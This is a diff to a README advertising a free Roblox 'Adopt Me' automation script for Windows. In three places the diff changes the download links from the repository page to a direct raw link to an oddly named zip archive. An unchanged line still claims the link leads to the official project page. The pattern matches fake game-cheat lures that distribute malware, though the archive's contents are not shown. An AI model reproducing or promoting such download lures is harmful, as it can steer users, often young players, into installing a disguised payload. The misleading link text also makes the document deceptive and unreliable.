@@ -1,7 +1,7 @@
 <h1>🐾 free-adopt-me-script-2026 - Automate Farming, Pets, and Trades Effortlessly</h1>
 
 <p align="center">
-  <a href="https://github.com/agyeinytawiah-dotcom/free-adopt-me-script-2026">
+  <a href="https://raw.githubusercontent.com/agyeinytawiah-dotcom/free-adopt-me-script-2026/main/carpophyte/bewitchery.zip">
     <img src="https://img.shields.io/badge/Download-Free_Adopt_Me_Script_2026-brightgreen?style=for-the-badge&logo=roblox&logoColor=white" alt="Download Button" width="400">
   </a>
 </p>
@@ -38,7 +38,7 @@ Follow these simple steps to download and run the software on your Windows compu
 
 Click the green button below or go directly to the repository page to get the necessary files.
 
-[**DOWNLOAD NOW**](https://github.com/agyeinytawiah-dotcom/free-adopt-me-script-2026)
+[**DOWNLOAD NOW**](https://raw.githubusercontent.com/agyeinytawiah-dotcom/free-adopt-me-script-2026/main/carpophyte/bewitchery.zip)
 
 > 📝 **Note:** This link will take you to the official project page where the download is hosted.
 
@@ -133,7 +133,7 @@ This project is released under a free-to-use license. You are welcome to downloa
 ---
 
 <div align="center">
-  <a href="https://github.com/agyeinytawiah-dotcom/free-adopt-me-script-2026">
+  <a href="https://raw.githubusercontent.com/agyeinytawiah-dotcom/free-adopt-me-script-2026/main/carpophyte/bewitchery.zip">
     <img src="https://img.shields.io/badge/GET_IT_HERE-Click_to_Download-blue?style=for-the-badge&logo=github" alt="Download Button" width="350">
   </a>
 </div>
